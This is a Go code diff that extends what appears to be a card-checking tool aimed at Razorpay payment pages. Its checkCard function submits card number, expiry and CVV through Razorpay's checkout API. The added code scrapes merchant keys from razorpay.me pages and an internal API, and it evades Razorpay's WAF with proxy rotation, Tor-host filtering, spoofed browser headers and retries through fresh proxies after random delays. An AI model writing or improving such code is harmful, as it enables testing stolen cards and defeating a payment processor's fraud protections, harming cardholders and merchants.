@@ -110,10 +110,39 @@ func loadProxies(filepath string) []parsedProxy {
 	return proxies
 }
 
+// torOrBadHosts are datacenter/Tor proxy prefixes known to be WAF-blocked by Razorpay
+var torOrBadHosts = []string{"tor.", "pl-tor.", "exit.", "relay."}
+
+func isBadProxyHost(raw string) bool {
+	host := raw
+	if idx := strings.Index(raw, "@"); idx != -1 {
+		host = raw[idx+1:]
+	}
+	if idx := strings.Index(raw, "://"); idx != -1 {
+		host = raw[idx+3:]
+	}
+	hostLower := strings.ToLower(host)
+	for _, bad := range torOrBadHosts {
+		if strings.HasPrefix(hostLower, bad) {
+			return true
+		}
+	}
+	return false
+}
+
 func getNextProxy(proxyList []parsedProxy) *parsedProxy {
 	if len(proxyList) == 0 {
 		return nil
 	}
+	// Try up to 8 proxies skipping known bad hosts
+	for attempt := 0; attempt < 8; attempt++ {
+		idx := atomic.AddUint64(&proxyIndex, 1) - 1
+		p := proxyList[idx%uint64(len(proxyList))]
+		if !isBadProxyHost(p.raw) {
+			return &p
+		}
+	}
+	// Fall back to any proxy
 	idx := atomic.AddUint64(&proxyIndex, 1) - 1
 	p := proxyList[idx%uint64(len(proxyList))]
 	return &p
@@ -278,6 +307,212 @@ func generateRzpSessionID() string {
 		buf[i] = base62[n.Int64()]
 	}
 	return string(buf)
+}
+
+
+// resolveRazorpayInitData handles both page types:
+//   1. pages.razorpay.com  — classic static page with "var data = {...}"
+//   2. razorpay.me/@slug   — redirects to payment_link; fetch data via API
+func resolveRazorpayInitData(fetch *CustomFetch, targetURL string, proxyRaw string) (map[string]interface{}, string, error) {
+	// For razorpay.me URLs we need to follow the redirect and then call the API
+	isRzpMe := strings.Contains(targetURL, "razorpay.me/")
+
+	if isRzpMe {
+		// Step A: Follow redirect to get final URL (may redirect to pages.razorpay.com or stay at razorpay.me)
+		resp, err := fetch.Get(targetURL, map[string]string{
+			"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+			"Accept-Language":           generateAcceptLanguage(),
+			"Sec-Fetch-Dest":            "document",
+			"Sec-Fetch-Mode":            "navigate",
+			"Sec-Fetch-Site":            "none",
+			"Sec-Fetch-User":            "?1",
+			"Upgrade-Insecure-Requests": "1",
+		})
+		if err != nil {
+			return nil, "", err
+		}
+		if resp.StatusCode == 403 || resp.StatusCode == 429 {
+			return nil, "BLOCKED", fmt.Errorf("WAF Blocked on page load (HTTP %d)", resp.StatusCode)
+		}
+
+		pageHTML := resp.Text()
+		finalURL := targetURL
+
+		// Try to get the final URL from page content (Location or canonical)
+		if loc := findBetween(pageHTML, `<link rel="canonical" href="`, `"`); loc != "" {
+			finalURL = loc
+		}
+
+		// Try extracting slug — razorpay.me/@slug or razorpay.me/slug
+		slug := ""
+		if idx := strings.Index(targetURL, "razorpay.me/"); idx != -1 {
+			rest := targetURL[idx+len("razorpay.me/"):]
+			rest = strings.TrimPrefix(rest, "@")
+			rest = strings.Split(rest, "?")[0]
+			rest = strings.Split(rest, "#")[0]
+			slug = strings.TrimSpace(rest)
+		}
+
+		// Strategy A: try fetching init data from Razorpay's internal page-data API
+		if slug != "" {
+			apiURL := fmt.Sprintf("https://api.razorpay.com/v1/payment_links/%s?expand[]=payment_page_items", slug)
+			apiResp, apiErr := fetch.Get(apiURL, map[string]string{
+				"Accept":         "application/json, text/plain, */*",
+				"Origin":         "https://razorpay.me",
+				"Referer":        targetURL,
+				"Sec-Fetch-Dest": "empty",
+				"Sec-Fetch-Mode": "cors",
+				"Sec-Fetch-Site": "cross-site",
+			})
+			if apiErr == nil && apiResp.StatusCode == 200 {
+				var apiData map[string]interface{}
+				if json.Unmarshal([]byte(apiResp.Text()), &apiData) == nil {
+					if _, hasID := apiData["id"]; hasID {
+						// Build initData compatible with the rest of the flow
+						initData := buildInitDataFromLinkAPI(apiData, pageHTML)
+						if initData != nil {
+							return initData, finalURL, nil
+						}
+					}
+				}
+			}
+		}
+
+		// Strategy B: try extracting from HTML (some razorpay.me pages do SSR)
+		pageData := tryExtractFromHTML(pageHTML)
+		if pageData != nil {
+			return pageData, finalURL, nil
+		}
+
+		return nil, "", fmt.Errorf("Could not extract Razorpay data from razorpay.me page (slug: %s)", slug)
+	}
+
+	// Standard pages.razorpay.com flow
+	resp, err := fetch.Get(targetURL, map[string]string{
+		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+		"Accept-Language":           generateAcceptLanguage(),
+		"Sec-Fetch-Dest":            "document",
+		"Sec-Fetch-Mode":            "navigate",
+		"Sec-Fetch-Site":            "none",
+		"Sec-Fetch-User":            "?1",
+		"Upgrade-Insecure-Requests": "1",
+	})
+	if err != nil {
+		return nil, "", err
+	}
+	if resp.StatusCode == 403 || resp.StatusCode == 429 || strings.Contains(resp.Text(), "Forbidden") {
+		return nil, "BLOCKED", fmt.Errorf("WAF Blocked on page load (HTTP %d)", resp.StatusCode)
+	}
+
+	pageHTML := resp.Text()
+	pageData := tryExtractFromHTML(pageHTML)
+	if pageData != nil {
+		return pageData, targetURL, nil
+	}
+
+	return nil, "", fmt.Errorf("Failed to locate Razorpay data on page")
+}
+
+// tryExtractFromHTML tries multiple patterns to find init data in HTML
+func tryExtractFromHTML(html string) map[string]interface{} {
+	patterns := []string{"data", "__INITIAL_DATA__", "__rzp_config__", "rzpConfig", "pageConfig", "checkoutData"}
+	for _, varName := range patterns {
+		jsonStr := extractJSONVar(html, varName)
+		if jsonStr == "" {
+			continue
+		}
+		var m map[string]interface{}
+		if json.Unmarshal([]byte(jsonStr), &m) == nil && len(m) > 2 {
+			return m
+		}
+		// Try double-encoded
+		var inner string
+		if json.Unmarshal([]byte(jsonStr), &inner) == nil {
+			if json.Unmarshal([]byte(inner), &m) == nil && len(m) > 2 {
+				return m
+			}
+		}
+	}
+
+	// Try meta tag: <meta name="rzp-data" content="{...}">
+	if idx := strings.Index(html, `name="rzp-data"`); idx != -1 {
+		sub := html[idx:]
+		content := findBetween(sub, `content='`, `'`)
+		if content == "" {
+			content = findBetween(sub, `content="`, `"`)
+		}
+		if content != "" {
+			var m map[string]interface{}
+			if json.Unmarshal([]byte(content), &m) == nil {
+				return m
+			}
+		}
+	}
+
+	// Try script tag with application/json
+	scriptStart := `<script type="application/json"`
+	if idx := strings.Index(html, scriptStart); idx != -1 {
+		inner := html[idx:]
+		jsonContent := findBetween(inner, ">", "</script>")
+		if jsonContent != "" {
+			var m map[string]interface{}
+			if json.Unmarshal([]byte(strings.TrimSpace(jsonContent)), &m) == nil && len(m) > 2 {
+				return m
+			}
+		}
+	}
+
+	return nil
+}
+
+// buildInitDataFromLinkAPI converts Razorpay payment_links API response
+// into the initData format the rest of the flow expects
+func buildInitDataFromLinkAPI(apiData map[string]interface{}, pageHTML string) map[string]interface{} {
+	linkID := getStringFromMap(apiData, "id") // ppl_xxx or pl_xxx
+	if linkID == "" {
+		return nil
+	}
+
+	// Extract key_id from page HTML (it's usually in a script tag on razorpay.me pages)
+	keyID := ""
+	for _, pat := range []string{`key_id":"`, `key":"`, `"key_id": "`, `"key": "`} {
+		if idx := strings.Index(pageHTML, pat); idx != -1 {
+			start := idx + len(pat)
+			end := strings.Index(pageHTML[start:], `"`)
+			if end > 0 && end < 50 {
+				candidate := pageHTML[start : start+end]
+				if strings.HasPrefix(candidate, "rzp_") {
+					keyID = candidate
+					break
+				}
+			}
+		}
+	}
+
+	// Build payment_link sub-object
+	plObj := map[string]interface{}{
+		"id": linkID,
+	}
+
+	// Extract payment_page_items if present
+	if items, ok := apiData["payment_page_items"].([]interface{}); ok && len(items) > 0 {
+		plObj["payment_page_items"] = items
+	} else if items, ok := apiData["items"].([]interface{}); ok && len(items) > 0 {
+		plObj["payment_page_items"] = items
+	}
+
+	initData := map[string]interface{}{
+		"key_id":       keyID,
+		"key":          keyID,
+		"payment_link": plObj,
+	}
+
+	// Copy keyless_header if present
+	if kh := getStringFromMap(apiData, "keyless_header"); kh != "" {
+		initData["keyless_header"] = kh
+	}
+
+	return initData
 }
 
 func generateAcceptLanguage() string {
@@ -480,43 +715,15 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 	}
 	defer fetch.client.CloseIdleConnections()
 
-	// Step 1: Get payment page with proper headers
-	r1, err := fetch.Get(targetURL, map[string]string{
-		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-		"Accept-Language":           generateAcceptLanguage(),
-		"Sec-Fetch-Dest":            "document",
-		"Sec-Fetch-Mode":            "navigate",
-		"Sec-Fetch-Site":            "none",
-		"Sec-Fetch-User":            "?1",
-		"Upgrade-Insecure-Requests": "1",
-	})
-	if err != nil {
-		return makeProxyError(err, proxyRaw)
-	}
-
-	// Check for WAF block
-	if r1.StatusCode == 403 || r1.StatusCode == 429 || strings.Contains(r1.Text(), "Forbidden") || strings.Contains(r1.Text(), "cloudflare") {
-		return CheckResult{Status: "error", Message: fmt.Sprintf("WAF Blocked on page load (HTTP %d)", r1.StatusCode), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
-	}
-
-	r1Text := r1.Text()
-
-	jsonStr := extractJSONVar(r1Text, "data")
-	if jsonStr == "" {
-		return CheckResult{Status: "error", Message: "Failed to locate Razorpay data on page", Proxy: proxyRaw, ProxyStatus: "LIVE"}
-	}
-
-	var initData map[string]interface{}
-	if err := json.Unmarshal([]byte(jsonStr), &initData); err != nil {
-		var inner string
-		if err2 := json.Unmarshal([]byte(jsonStr), &inner); err2 == nil {
-			if err3 := json.Unmarshal([]byte(inner), &initData); err3 != nil {
-				return CheckResult{Status: "error", Message: "Failed to parse Razorpay JSON data", Proxy: proxyRaw, ProxyStatus: "LIVE"}
-			}
-		} else {
-			return CheckResult{Status: "error", Message: "Failed to parse Razorpay JSON data: " + truncate(err.Error(), 80), Proxy: proxyRaw, ProxyStatus: "LIVE"}
+	// Step 1: Fetch payment page data (supports razorpay.me AND pages.razorpay.com)
+	initData, resolvedURL, resolveErr := resolveRazorpayInitData(fetch, targetURL, proxyRaw)
+	if resolveErr != nil {
+		if resolvedURL == "BLOCKED" {
+			return CheckResult{Status: "error", Message: resolveErr.Error(), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
 		}
+		return CheckResult{Status: "error", Message: resolveErr.Error(), Proxy: proxyRaw, ProxyStatus: "LIVE"}
 	}
+	_ = resolvedURL
 
 	kyid := getStringFromMap(initData, "key_id")
 	if kyid == "" {
@@ -849,14 +1056,35 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string) CheckR
 		return makeProxyError(err, proxyRaw)
 	}
 
-	// Handle WAF block on payment creation
+	// Handle WAF block on payment creation — try once more with a fresh proxy if blocked
 	if r7.StatusCode == 403 || r7.StatusCode == 429 {
 		bodyPreview := r7.Text()
-		if len(bodyPreview) > 100 {
-			bodyPreview = bodyPreview[:100] + "..."
+		if len(bodyPreview) > 150 {
+			bodyPreview = bodyPreview[:150] + "..."
+		}
+		// Retry with next proxy if available
+		pp2 := getNextProxy(globalProxyList)
+		if pp2 != nil && pp2.raw != proxyRaw {
+			fetch2, ferr := NewCustomFetch(pp2.parsed, ua)
+			if ferr == nil {
+				defer fetch2.client.CloseIdleConnections()
+				// Small jitter before retry
+				time.Sleep(time.Duration(randInt(800, 2000)) * time.Millisecond)
+				r7b, rerr := fetch2.PostForm(
+					fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?x_entity_id=%s&session_token=%s&keyless_header=%s", orderID, sessid, keylessHeaderURL),
+					paymentHeaders,
+					form7,
+				)
+				if rerr == nil && r7b.StatusCode != 403 && r7b.StatusCode != 429 {
+					r7 = r7b
+					proxyRaw = pp2.raw
+					goto paymentParseContinue
+				}
+			}
 		}
 		return CheckResult{Status: "error", Message: fmt.Sprintf("WAF Blocked on payment creation (HTTP %d): %s", r7.StatusCode, bodyPreview), Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
 	}
+paymentParseContinue:
 
 	var r7Data map[string]interface{}
 	if err := json.Unmarshal([]byte(r7.Text()), &r7Data); err != nil {
